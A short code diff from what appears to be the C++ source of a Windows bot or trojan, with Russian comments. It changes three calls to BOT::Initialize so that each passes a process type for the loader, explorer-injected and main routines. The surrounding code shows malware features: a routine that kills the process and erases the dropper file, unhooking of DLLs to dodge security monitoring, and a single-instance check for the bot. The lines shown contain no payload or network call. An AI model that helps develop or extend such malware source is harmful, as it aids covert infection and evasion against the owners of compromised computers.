@@ -100,7 +100,7 @@ void DeleteDropper() // убиваем процесс, стираем файл
 
 DWORD WINAPI LoaderRoutine( LPVOID lpData )
 {
-	BOT::Initialize();
+	BOT::Initialize(ProcessLoader);
 	
 	MDBG("Main", "*************** LoaderRoutine (PID:%d)", GetUniquePID());
 
@@ -217,7 +217,7 @@ void ExplorerMain()
 
 DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 {
-	BOT::Initialize();
+	BOT::Initialize(ProcessExplorer);
 
 	UnhookDlls();
 	
@@ -242,7 +242,7 @@ DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 
 int APIENTRY MyMain() 
 {
-	BOT::Initialize();
+	BOT::Initialize(ProcessUnknown);
 
 	// Проверяем не запущен ли на данном компьютере другой экземпляр бота
 	if (BOT::IsRunning())
